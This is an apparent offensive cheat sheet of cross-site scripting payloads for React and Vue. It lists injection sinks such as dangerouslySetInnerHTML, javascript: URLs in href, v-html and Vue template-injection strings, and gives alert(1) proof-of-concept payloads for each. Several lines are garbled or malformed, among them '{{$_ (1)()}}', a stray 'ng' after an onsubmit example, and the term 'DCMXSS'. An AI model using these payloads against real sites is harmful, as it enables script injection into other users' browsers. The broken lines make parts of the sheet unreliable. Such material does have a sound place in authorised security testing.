# FRAMEWORK-SPECIFIC XSS MATRIX (2026)
# SPA frameworks often sanitize/escape differently. Know the sink per framework.

## 1) React
# XSS carries on:  dangerouslySetInnerHTML, and attribute values (href/src) with javascript: scheme.
<div dangerouslySetInnerHTML={{__html: PA}}/>          # innerHTML sink - <script> won't run, img onerror will
<a href={PA}>link</a>                                    # javascript:alert(1) works
<img src={PA}/>                                          # some filters strip
# React CVEs: CVE-2015-1300 (e.g. jsx-attrs); fixed. Modern attack: prototype pollution.
#if you see __html everywhere - DCMXSS candidates:
autofocus onfocus=alert(1) tabindex=1                    # no JS eval - pure DOM
# in event handler strings:  <img src=x onerror={PA}/>  -> PA like: alert(1)

## 2) Vue (v-html, v-bind, templates never escaped)
<div v-html="PA"></div>                                 # raw HTML - img onerror
<a :href="PA">x</a>                                      # javascript:
# Vue template injection (server-side render context / no sandbox):
{{constructor.constructor('alert(1)')()}}
{{$_ (1)()}}                                             # Vue 2.x classic
# Vue directives:  v-on:click="alert(1)"  or  onsubmit="..."ng
# v-if template parse:  <template v-if="PA">
